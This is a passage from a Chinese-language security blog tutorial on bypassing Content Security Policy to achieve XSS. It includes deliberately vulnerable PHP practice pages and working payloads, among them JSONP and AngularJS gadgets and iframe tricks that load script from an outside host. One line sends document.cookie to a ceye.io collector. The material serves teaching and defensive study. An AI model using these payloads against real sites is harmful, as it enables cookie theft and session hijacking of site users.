+<pre class=" language-http"><code class="language-http">?src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js&amp;profile=&lt;div ng-app>{{constructor.constructor('alert(/xss/)')()}}</code></pre>
+<h3 id="Demo-4-JSONP"><a href="#Demo-4-JSONP" class="headerlink" title="Demo 4 - JSONP"></a>Demo 4 - JSONP</h3><p>大部分站点的jsonp是完全可控的，只不过有些站点会让jsonp不返回html类型防止直接的反射型XSS，但是如果将url插入到script标签中，除非设置x-content-type-options头，否者尽管返回类型不一致，浏览器依旧会当成js进行解析</p>
+<ul>
+<li>案例：<a href="https://corb3nik.github.io/blog/ins-hack-2019/bypasses-everywhere" target="_blank" rel="noopener">bypasses-everywhere 解法 1</a> <a href="https://jbz.team/inshack2019/Bypasses_Everywhere" target="_blank" rel="noopener">bypasses-everywhere 解法 2</a></li>
+<li>可用cdn - JSONP(但不知道如何快速获取参数？)：<a href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/json/jsonp.json" target="_blank" rel="noopener">csp-evaluator</a></li>
+</ul>
+<p>条件：</p>
+<ol>
+<li>可控 JSONP</li>
+<li>JSONP 地址在 CSP 白名单中</li>
+</ol>
+<p><strong>存在问题，不好控制返回内容</strong></p>
+<h4 id="练习题-3"><a href="#练习题-3" class="headerlink" title="练习题"></a>练习题</h4><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//demo.php</span>
+<span class="token delimiter">&lt;?php</span>
+<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Security-Policy: script-src www.google.com; default-src 'none';"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'src'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token string">"&lt;script src='"</span> <span class="token punctuation">.</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'src'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"'>&lt;/script>"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token string">"try src"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span></code></pre>
+<p>利用</p>
+<pre class=" language-plain"><code class="language-plain">?src=https://www.google.com/complete/search?client=chrome&q=hello&callback=alert
+
+?src=https://www.google.com/complete/search?client=chrome&q=document.write(%22<script src=//IPS:PORT/PAYLOAD.js></script>%22)//&callback=top.FRAMEID.setTimeout</code></pre>
+<h3 id="Demo-5-Script-Tag"><a href="#Demo-5-Script-Tag" class="headerlink" title="Demo 5 - Script Tag"></a>Demo 5 - Script Tag</h3><p>这个相对来说比较常见，利用 UA 自动闭合标签的性质</p>
+<p>当浏览器碰到一个左尖括号时，会变成标签开始状态，然后会一直持续到碰到右尖括号为止，在其中的数据都会被当成标签名或者属性，所以第五行的<code>&lt;script</code>会变成一个属性，值为空，之后的<code>nonce=&#39;xxxxx&#39;</code>会被当成我们输入的script的标签的一个属性，相当于我们盗取了合法的script标签中的nonce，于是成功绕过了<code>scripr-src</code></p>
+<p>这里需要注意，UA接收输入的<code>&quot;</code>在之后遇到<code></code>(空格)后会直接闭合，具体情况可以在 Elements 中查看</p>
+<h4 id="练习题-4"><a href="#练习题-4" class="headerlink" title="练习题"></a>练习题</h4><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//demo.php</span>
+<span class="token delimiter">&lt;?php</span>
+<span class="token keyword">function</span> <span class="token function">randHash</span><span class="token punctuation">(</span><span class="token variable">$len</span> <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">return</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">openssl_random_pseudo_bytes</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token variable">$len</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token variable">$nonce</span> <span class="token operator">=</span> <span class="token function">randHash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Security-Policy: default-src 'none'; script-src 'nonce-"</span> <span class="token punctuation">.</span> <span class="token variable">$nonce</span> <span class="token punctuation">.</span> <span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'src'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'src'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">echo</span> <span class="token string">"&lt;script nonce="</span> <span class="token punctuation">.</span> <span class="token variable">$nonce</span> <span class="token punctuation">.</span> <span class="token string">">console.log('no xss');&lt;/script>"</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<p>利用，目前只能在 Firefox 中成功，Chrome 下无法获取到 nonce</p>
+<pre class=" language-http"><code class="language-http">?src=&lt;script src="data:text/plain,alert(1)"
+
+// 原本 chrome 的利用，通过标签重复属性只解析第一个，吃掉后续的 &lt;script 否则会报错，但测试已无效
+?src=&lt;script src="data:text/plain,alert(1)" a=1 a=</code></pre>
+<h3 id="Demo-6-SVG"><a href="#Demo-6-SVG" class="headerlink" title="Demo 6 - SVG"></a>Demo 6 - SVG</h3><p>SVG 是一种基于 XML 语法的图像格式，全称是可缩放矢量图（Scalable Vector Graphics）。其他图像格式都是基于像素处理的，SVG 则是属于对图像的形状描述，所以它本质上是文本文件，体积较小，且不管放大多少倍都不会失真。</p>
+<p>案例：<a href="https://xz.aliyun.com/t/4492" target="_blank" rel="noopener">https://xz.aliyun.com/t/4492</a></p>
+<p>这个实际和 CSP 没有太多关系，完全是因为<a href="https://www.w3.org/TR/SVGTiny12/script.html#ScriptElement" target="_blank" rel="noopener">svg - script</a>的特性</p>
+<hr>
+<p>这里还牵扯到一个知识点：为什么 xss 只在单独渲染的 svg 页面才会触发？</p>
+<p>没有在chrome中找到相关信息，而在FF中有所提及<a href="https://developer.mozilla.org/zh-CN/docs/Web/SVG/SVG_as_an_Image" target="_blank" rel="noopener">SVG图片渲染</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/66ad34dc/2019-08-23-15662881865177.jpg" alt="-w700"></p>
+<p>实际上有两种方法触发：</p>
+<ol>
+<li><p>直接访问 .svg 文件页面</p>
+</li>
+<li><p>在HTML页面中利用<code>&lt;embed&gt;</code>引入图片</p>
+<pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>embed</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>attack.svg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre>
+</li>
+</ol>
+<h4 id="练习题-5"><a href="#练习题-5" class="headerlink" title="练习题"></a>练习题</h4><p><a href="http://web50.zajebistyc.tf/" target="_blank" rel="noopener">http://web50.zajebistyc.tf/</a></p>
+<h3 id="Demo-8-Cache-poisoning"><a href="#Demo-8-Cache-poisoning" class="headerlink" title="Demo 8 - Cache poisoning"></a>Demo 8 - Cache poisoning</h3><p><a href="https://www.anquanke.com/post/id/156356" target="_blank" rel="noopener">实战Web缓存投毒（上）</a><br><a href="https://www.anquanke.com/post/id/156551#h3-10" target="_blank" rel="noopener">实战Web缓存投毒（下）</a><br><a href="https://ctftime.org/writeup/13925" target="_blank" rel="noopener">https://ctftime.org/writeup/13925</a></p>
+<h3 id="Demo-9-Static-Resource"><a href="#Demo-9-Static-Resource" class="headerlink" title="Demo 9 - Static Resource"></a>Demo 9 - Static Resource</h3><p>还是利用了白名单中<code>www.google-analytics.com</code>，不清楚 baidu 有没有类似的应用(我猜没有)</p>
+<p>案例：<a href="https://github.com/k1tten/writeups/blob/master/bugbounty_writeup/HackMD_XSS_%26_Bypass_CSP.md" target="_blank" rel="noopener">HackMD Stored XSS &amp; Bypass CSP with Google Tag Manager</a></p>
+<p>条件：</p>
+<ol>
+<li>script-src 白名单</li>
+<li>script-src 允许 ‘unsafe-eval’</li>
+</ol>
+<h4 id="准备步骤"><a href="#准备步骤" class="headerlink" title="准备步骤"></a>准备步骤</h4><ol>
+<li>登录 <a href="https://tagmanager.google.com/" target="_blank" rel="noopener">https://tagmanager.google.com/</a></li>
+<li>创建工作区，记录右上的代码<br><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/66ad34dc/2019-08-23-15662785455827.jpg" alt="-w1671"></li>
+<li>进入”变量 - 用户定义的变量”，新建变量，选择”自定义JavaScript”<br><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/66ad34dc/2019-08-23-15662786923758.jpg" alt="-w1109"></li>
+<li>进入”代码 - 新建”，先新建一个”触发条件”<br><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/66ad34dc/2019-08-23-15662796730917.jpg" alt="-w1265"></li>
+<li>然后创建一个”代码”，注意红框的选项，之后还要创建一个变量<br><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/66ad34dc/2019-08-23-15662802001336.jpg" alt="-w1284"></li>
+<li>在<code>跟踪ID</code>中选择之前创建的自定义JS的那个变量，之后一路保存<br><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/66ad34dc/2019-08-23-15662802991888.jpg" alt="-w1171"></li>
+<li>最后大致的样子<br><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/66ad34dc/2019-08-23-15662804213656.jpg" alt="-w1103"></li>
+<li>保存提交，有点类似 git 的操作</li>
+<li>最后在目标页面引入 JS 即可</li>
+</ol>
+<pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!-- ID 通过第二步获取 --></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://www.google-analytics.com/gtm/js?id<span class="token punctuation">=</span>GTM-WNH4HPH<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/66ad34dc/2019-08-23-15662807640303.jpg" alt="-w448"></p>
+<h3 id="Demo-10-sandbox-Bypass"><a href="#Demo-10-sandbox-Bypass" class="headerlink" title="Demo 10 - sandbox Bypass"></a>Demo 10 - sandbox Bypass</h3><p><a href="https://xz.aliyun.com/t/2438" target="_blank" rel="noopener">如何巧妙绕过CSP</a></p>
+<blockquote>
+<p>大多数现代浏览器会自动将文件（如文本文件或图像）转换为HTML页面</p>
+</blockquote>
+<p>浏览器之所以这么做，是为了能够在浏览器窗口中正确描述相关内容：它需要布置正确的背景，进行居中，等等。但是，iframe也是一个浏览器窗口！因此，只要内容类型正确，那么，在打开需要利用iframe在浏览器中显示的任何文件（即favicon.ico或robots.txt）的时候，将立即将它们转换为HTML，而无需进行任何数据检查。</p>
+<p>如果frame可以打开没有CSP标头的网站页面的话，那会发生什么呢？想必您已经猜到答案了。如果没有CSP，打开的frame将执行页面内的所有JS代码。如果页面带有XSS漏洞，我们就可以自己将js写入frame。</p>
+<h4 id="1-without-X-Frame-Options-DENY"><a href="#1-without-X-Frame-Options-DENY" class="headerlink" title="1. without X-Frame-Options:DENY"></a>1. without X-Frame-Options:DENY</h4><p>通过iframe引入外部js，将src设置为同域的，从而绕过CSP的<code>default-src &#39;self&#39;</code>规则</p>
+<h5 id="练习题-6"><a href="#练习题-6" class="headerlink" title="练习题"></a>练习题</h5><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//demo.php</span>
+<span class="token delimiter">&lt;?php</span>
+<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Security-Policy: default-src 'self' 'unsafe-inline'; sandbox allow-forms allow-same-origin allow-scripts allow-modals allow-popups"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>
+    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span>
+        <span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'src'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter">?></span>
+    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span></code></pre>
+<p>利用</p>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">?</span>src<span class="token operator">=</span>
+f <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+f<span class="token punctuation">.</span>id <span class="token operator">=</span> <span class="token string">'test'</span><span class="token punctuation">;</span>
+f<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">'./robots.txt'</span><span class="token punctuation">;</span>
+f<span class="token punctuation">.</span>onload <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
+    x <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    x<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">"//q9dgwp80.xyz/1.js"</span><span class="token punctuation">;</span>
+    test<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span>document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
+document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+或
+
+<span class="token operator">?</span>src<span class="token operator">=</span>window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'//xxx.ceye.io/?'</span><span class="token operator">+</span><span class="token function">escape</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+<h4 id="2-with-X-Frame-Options-DENY"><a href="#2-with-X-Frame-Options-DENY" class="headerlink" title="2. with X-Frame-Options:DENY"></a>2. with X-Frame-Options:DENY</h4><p>这里可使用CSP的第二个常见错误，即在返回Web扫描程序错误时没有提供保护性头部。若要验证这一点，最简单方法是尝试打开并不存在的网页。因为许多资源只为含有200代码的响应提供了X-Frame-Options头部，而没有为包含404代码的响应提供相应的头部</p>
+<pre class=" language-javascript"><code class="language-javascript">f <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+f<span class="token punctuation">.</span>id <span class="token operator">=</span> <span class="token string">'test'</span><span class="token punctuation">;</span>
+f<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">'./不想存在页面'</span><span class="token punctuation">;</span>
+f<span class="token punctuation">.</span>onload <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
+    x <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    x<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">"//q9dgwp80.xyz/1.js"</span><span class="token punctuation">;</span>
+    test<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span>document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
+document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<h3 id="Demo-11-JPEG"><a href="#Demo-11-JPEG" class="headerlink" title="Demo 11 - JPEG"></a>Demo 11 - JPEG</h3><p>通过将 jpeg 内容注释以通过 JS 检测，但是需要配合charset指定编码<br><a href="https://portswigger.net/blog/bypassing-csp-using-polyglot-jpegs" target="_blank" rel="noopener">Bypassing CSP using polyglot JPEGs</a><br>翻译：<a href="https://paper.seebug.org/133/" target="_blank" rel="noopener">https://paper.seebug.org/133/</a></p>
+<p>在最新版浏览器上基本无法 bypass mime type 检测，只能理论上理解一下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/66ad34dc/2019-08-23-15665393703838.jpg" alt></p>
+<p>以下两张图片，二进制查看就能大致明白</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/66ad34dc/2019-08-23-xss.jpg" alt="xss"><br><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/66ad34dc/2019-08-23-xss2.jpg" alt="xss2"></p>
+<h2 id="推荐延伸"><a href="#推荐延伸" class="headerlink" title="推荐延伸"></a>推荐延伸</h2><ol>
+<li><p><a href="https://inside.pixiv.blog/kobo/5137" target="_blank" rel="noopener">Content Security Policy Level 3におけるXSS対策</a><br><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/66ad34dc/2019-08-23-15661970228810.png" alt="-w1022"></p>
+</li>
+<li><p>我的CSP绕过思路及总结：<a href="https://xz.aliyun.com/t/5084#toc-7" target="_blank" rel="noopener">https://xz.aliyun.com/t/5084#toc-7</a></p>
+</li>
+</ol>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy" target="_blank" rel="noopener">Content-Security-Policy</a></li>
+<li><a href="https://xz.aliyun.com/t/5084#toc-6" target="_blank" rel="noopener">https://xz.aliyun.com/t/5084#toc-6</a></li>
+<li><a href="https://developers.google.com/web/fundamentals/security/csp/?hl=zh-cn" target="_blank" rel="noopener">https://developers.google.com/web/fundamentals/security/csp/?hl=zh-cn</a></li>
+<li><a href="https://www.mi1k7ea.com/2019/02/24/CSP策略及绕过技巧小结/" target="_blank" rel="noopener">https://www.mi1k7ea.com/2019/02/24/CSP策略及绕过技巧小结/</a></li>
+</ol>
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://blog.sari3l.com">Sariel.D</a>
+            <p>原文链接：<a href="https://blog.sari3l.com/posts/66ad34dc/">https://blog.sari3l.com/posts/66ad34dc/</a>
+            <p>发表日期：<a href="https://blog.sari3l.com/posts/66ad34dc/">August 23rd 2019, 11:44:41 pm</a>
+            <p>更新日期：<a href="https://blog.sari3l.com/posts/66ad34dc/">July 6th 2020, 5:44:56 pm</a>
+            <p>版权声明：本文采用<a rel="license noopener" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/posts/a62f29f1/" title= "XSS with ServiceWorkers">
+                    <div class="nextTitle">XSS with ServiceWorkers</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/posts/13977d3a/" title= "SVG with HTML Parsing">
+                    <div class="prevTitle">SVG with HTML Parsing</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- gitalk评论 -->
+
+    <!-- utteranc评论 -->
+
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:master@mail.sari3l.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="https://github.com/sari3l" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="https://www.instagram.com/x3rias" class="iconfont-archer instagram" target="_blank" title=instagram></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <!-- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#启用-CSP-方式"><span class="toc-number">1.</span> <span class="toc-text">启用 CSP 方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#语法"><span class="toc-number">2.</span> <span class="toc-text">语法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#指令"><span class="toc-number">3.</span> <span class="toc-text">指令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#获取指令-Fetch-directives"><span class="toc-number">3.1.</span> <span class="toc-text">获取指令 Fetch directives</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#child-src"><span class="toc-number">3.1.1.</span> <span class="toc-text">child-src</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#connect-src"><span class="toc-number">3.1.2.</span> <span class="toc-text">connect-src</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#default-src"><span class="toc-number">3.1.3.</span> <span class="toc-text">default-src</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#font-src"><span class="toc-number">3.1.4.</span> <span class="toc-text">font-src</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#frame-src"><span class="toc-number">3.1.5.</span> <span class="toc-text">frame-src</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#img-src"><span class="toc-number">3.1.6.</span> <span class="toc-text">img-src</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#manifest-src"><span class="toc-number">3.1.7.</span> <span class="toc-text">manifest-src</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#media-src"><span class="toc-number">3.1.8.</span> <span class="toc-text">media-src</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#object-src"><span class="toc-number">3.1.9.</span> <span class="toc-text">object-src</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#script-src"><span class="toc-number">3.1.10.</span> <span class="toc-text">script-src</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#unsafe-inline"><span class="toc-number">3.1.10.1.</span> <span class="toc-text">unsafe-inline</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#unsafe-eval"><span class="toc-number">3.1.10.2.</span> <span class="toc-text">unsafe-eval</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#strict-dynamic"><span class="toc-number">3.1.10.3.</span> <span class="toc-text">strict-dynamic</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#style-src"><span class="toc-number">3.1.11.</span> <span class="toc-text">style-src</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#webrtc-src"><span class="toc-number">3.1.12.</span> <span class="toc-text">webrtc-src</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#worker-src"><span class="toc-number">3.1.13.</span> <span class="toc-text">worker-src</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#文档指令-Document-directives"><span class="toc-number">3.2.</span> <span class="toc-text">文档指令 Document directives</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#base-uri"><span class="toc-number">3.2.1.</span> <span class="toc-text">base-uri</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#plugin-types"><span class="toc-number">3.2.2.</span> <span class="toc-text">plugin-types</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sandbox"><span class="toc-number">3.2.3.</span> <span class="toc-text">sandbox</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#导航指令-Navigation-directives"><span class="toc-number">3.3.</span> <span class="toc-text">导航指令 Navigation directives</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#form-action"><span class="toc-number">3.3.1.</span> <span class="toc-text">form-action</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#frame-ancestors"><span class="toc-number">3.3.2.</span> <span class="toc-text">frame-ancestors</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#navigation-to"><span class="toc-number">3.3.3.</span> <span class="toc-text">navigation-to</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#报告指令-amp-其他指令"><span class="toc-number">3.4.</span> <span class="toc-text">报告指令 &amp; 其他指令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass"><span class="toc-number">4.</span> <span class="toc-text">Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Demo-1-iframe-CSP-attribute"><span class="toc-number">4.1.</span> <span class="toc-text">Demo 1 - iframe CSP attribute</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#练习题"><span class="toc-number">4.1.1.</span> <span class="toc-text">练习题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Demo-2-base-uri"><span class="toc-number">4.2.</span> <span class="toc-text">Demo 2 - base-uri</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#练习题-1"><span class="toc-number">4.2.1.</span> <span class="toc-text">练习题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Demo-3-CDN"><span class="toc-number">4.3.</span> <span class="toc-text">Demo 3 - CDN</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#练习题-2"><span class="toc-number">4.3.1.</span> <span class="toc-text">练习题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Demo-4-JSONP"><span class="toc-number">4.4.</span> <span class="toc-text">Demo 4 - JSONP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#练习题-3"><span class="toc-number">4.4.1.</span> <span class="toc-text">练习题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Demo-5-Script-Tag"><span class="toc-number">4.5.</span> <span class="toc-text">Demo 5 - Script Tag</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#练习题-4"><span class="toc-number">4.5.1.</span> <span class="toc-text">练习题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Demo-6-SVG"><span class="toc-number">4.6.</span> <span class="toc-text">Demo 6 - SVG</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#练习题-5"><span class="toc-number">4.6.1.</span> <span class="toc-text">练习题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Demo-8-Cache-poisoning"><span class="toc-number">4.7.</span> <span class="toc-text">Demo 8 - Cache poisoning</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Demo-9-Static-Resource"><span class="toc-number">4.8.</span> <span class="toc-text">Demo 9 - Static Resource</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#准备步骤"><span class="toc-number">4.8.1.</span> <span class="toc-text">准备步骤</span></a></li></ol></li><li class="toc-item 